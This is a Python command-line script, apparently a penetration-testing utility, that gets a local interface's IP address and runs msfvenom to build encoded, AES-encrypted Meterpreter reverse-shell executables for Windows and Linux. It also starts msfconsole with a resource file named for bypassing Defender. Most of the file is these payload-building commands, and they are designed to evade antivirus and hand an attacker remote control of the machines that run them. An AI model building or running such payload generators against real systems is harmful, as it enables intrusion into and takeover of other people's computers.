import click
import netifaces
import os

# Get the IP address of the specified network interface
def get_ip(interface):
    try:
        return netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
    except (ValueError, KeyError):
        click.echo(f"[-] Error: Could not find IP for interface '{interface}'", err=True)
        exit(1)

@click.command()
@click.option("--interface", "-if", required=True, help="Network interface to use for the payload")
# @click.option("--output-dir", "-o", default=".", help="Directory to save the generated payloads")
def generate_payloads(interface):
    """Generates Windows and Linux Meterpreter payloads for the specified interface"""

    ip = get_ip(interface)  
    # if not os.path.exists(output_dir):
    #     os.makedirs(output_dir)

    # payloads = {
    #     # "windows/x64/meterpreter/reverse_tcp": f"{output_dir}/windows_x64_meterpreter_tcp_staged_{ip}.exe",
    #     "windows/x64/meterpreter/reverse_https": f"{output_dir}/windows_x64_meterpreter_https_staged_{ip}.exe",
    #     "linux/x64/meterpreter/reverse_tcp": f"{output_dir}/linux_x64_meterpreter_tcp_staged_{ip}.elf",
    #     # "windows/x64/meterpreter_reverse_tcp": f"{output_dir}/windows_x64_meterpreter_tcp_stageless_{ip}.exe",
    #     "windows/x64/meterpreter_reverse_https": f"{output_dir}/windows_x64_meterpreter_https_stageless_{ip}.exe",
    #     # "linux/x64/meterpreter_reverse_tcp": f"{output_dir}/linux_x64_meterpreter_tcp_stageless_{ip}.elf",
    #     "linux/x64/meterpreter_reverse_https": f"{output_dir}/linux_x64_meterpreter_https_stageless_{ip}.elf",
    #     # "windows/x64/powershell_reverse_tcp_ssl": f"{output_dir}/windows_x64_powershell_tcp_ssl_stageless_{ip}.exe",
    #     # "windows/x64/powershell_bind_tcp": f"{output_dir}/windows_x64_powershell_bind_tcp_stageless_{ip}.exe",
    #     "windows/x64/vncinject/reverse_https": f"{output_dir}/windows_x64_vncinject_https_staged_{ip}.exe",
    #     # "linux/x64/meterpreter/bind_tcp": f"{output_dir}/linux_x64_meterpreter_bind_tcp_staged_{ip}.elf",
    #     # "linux/x64/shell/bind_tcp": f"{output_dir}/linux_x64_shell_bind_tcp_staged_{ip}.elf",
    #     # "windows/x64/shell/bind_tcp": f"{output_dir}/windows_x64_shell_bind_tcp_staged_{ip}.exe",
    #     # "linux/x64/shell_bind_tcp": f"{output_dir}/linux_x64_shell_bind_tcp_stageless_{ip}.elf",
    #     # "windows/x64/shell_bind_tcp": f"{output_dir}/windows_x64_shell_bind_tcp_stageless_{ip}.exe",        
    # }

    # for payload, output in payloads.items():
    #     protocol = "https" if "https" in payload else "tcp"
    #     cmd = f"msfvenom -p {payload} -e x64/xor_dynamic -i 5 --encrypt aes256 --smallest LHOST={ip} LPORT=8443 -f exe > {output}" if "windows" in payload else \
    #           f"msfvenom -p {payload} -e x64/xor_dynamic -i 5 --encrypt aes256 --smallest LHOST={ip} LPORT=5000 -f elf > {output}"

    click.secho(f"[+] Generating payloads for {ip}...", fg="green", bold=True)
    os.system(f"msfvenom -p windows/x64/meterpreter/reverse_https -e x64/xor_dynamic -i 5 --encrypt aes256 --smallest LHOST={ip} LPORT=8443 -f exe > windows_x64_meterpreter_https_staged_{ip}_8443.exe")
    os.system(f"msfvenom -p windows/x64/meterpreter_reverse_https -e x64/xor_dynamic -i 5 --encrypt aes256 --smallest LHOST={ip} LPORT=8444 -f exe > windows_x64_meterpreter_https_stageless_{ip}_8444.exe")
    os.system(f"msfvenom -p windows/x64/vncinject/reverse_https -e x64/xor_dynamic -i 5 --encrypt aes256 --smallest LHOST={ip} LPORT=8445 -f exe > windows_x64_meterpreter_vnc_https_staged_{ip}_8445.exe")


    os.system(f"msfvenom -p linux/x64/meterpreter/reverse_tcp -i 3 --encrypt aes256 --smallest LHOST={ip} LPORT=5001 -f elf > linux_x64_meterpreter_tcp_staged_{ip}_5001.elf")
    os.system(f"msfvenom -p linux/x64/meterpreter_reverse_https -i 3 --encrypt aes256 --smallest LHOST={ip} LPORT=5000 -f elf > linux_x64_meterpreter_https_stageless_{ip}_5000.elf")
    os.system(f"msfconsole -r ../msf-resource/bypass-defender.rc")


    click.secho("[+] Payloads generated successfully!", fg="green", bold=True)
    click.secho("[!] Make sure to use a multi/handler with the correct payload settings. By default the LPORT is 8443 for windows https staged, and 8444 for windows stageless and 5000 for linux stageless, and 5001 for linux staged. This allows you to use port 8080 for file transfers.", fg="yellow", bold=True)
    # click.secho("[*] Be sure to sudo msfconsole to allow listening over 443.", fg="yellow", bold=True)
    click.secho("[*] These are all x64 payloads and will not work on x86 systems.", fg="yellow", bold=True)

if __name__ == "__main__":
    generate_payloads()
